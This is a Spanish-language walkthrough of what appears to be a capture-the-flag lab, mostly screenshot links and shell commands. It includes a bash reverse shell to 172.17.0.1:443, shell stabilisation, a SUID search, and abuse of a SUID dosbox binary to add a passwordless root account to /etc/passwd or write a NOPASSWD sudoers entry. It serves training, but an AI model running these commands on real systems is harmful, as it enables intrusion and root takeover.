![](Pasted%20image%2020250318212605.png)

![](Pasted%20image%2020250318212819.png)

![](Pasted%20image%2020250318212838.png)

![](Pasted%20image%2020250318213712.png)

![](Pasted%20image%2020250318214422.png)

![](Pasted%20image%2020250318214934.png)

```bash
bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
```

![](Pasted%20image%2020250318215349.png)


Sanitizacion de la shell (TTY):

Copy

```bash
script /dev/null -c bash
```

Copy

```bash
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

una vez adentro pudimos ver el historial del usuario:
``` bash
ninhack@beb59094ca80:~$ cat .bash_history
cat .bash_history
wget https://archive.apache.org/dist/lucene/solr/8.3.1/solr-8.3.1.tgz
tar -xvzf solr-8.3.1.tgz 
ls -al
cd solr-8.3.1
ls -al
cd ..
mv solr-8.3.1 /opt/solr
exit
bin/solr create_core -c 0xDojo
sudo apt install default-jdk
exit
bin/solr create_core -c 0xDojo
bin/solr start
bin/solr create_core -c 0xDojo
exit
exit

```

No hay nada ahí, tampoco en por sudo, pero por SUID:
```bash
find / -perm -4000 -ls 2>/dev/null
...
9614   2504 -rwsr-xr-x   1 root     root   560896 Sep 19  2022 /usr/bin/dosbox

```


```bash
LFILE_PASSWD='/etc/passwd'
/usr/bin/dosbox -c 'mount c /' -c "echo 'TioGilip0llas::0:0::/root:/bin/bash' >> c:$LFILE_PASSWD" -c exit

su TioGilip0llas -s /bin/bash
```

En caso de que exista retorno de carro en las lineas de /etc/passwd (limpiar archivo)
```bash
LFILE_SCRIPT='/tmp/clean.sh'
echo -e '#!/bin/sh\nsed -i "s/\\r//g" /etc/passwd' | /usr/bin/dosbox -c 'mount c /' -c "echo - > c:$LFILE_SCRIPT" -c exit

/usr/bin/dosbox -c 'mount c /' -c "chmod +x c:$LFILE_SCRIPT" -c exit

/usr/bin/dosbox -c 'mount c /' -c "c:\\tmp\\clean.sh" -c exit
```

Una opción más 
``` bash
ninhack@7046aae9dd7c:~$ echo $LFILE_SUDOERS
\etc\sudoers.d\ninhack
ninhack@7046aae9dd7c:~$ /usr/bin/dosbox -c 'mount c /' -c "echo ninhack ALL=(ALL) NOPASSWD: ALL >c:$LFILE" -c exit

DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ninhack@7046aae9dd7c:~$ sudo su
root@7046aae9dd7c:/home/ninhack# 

```
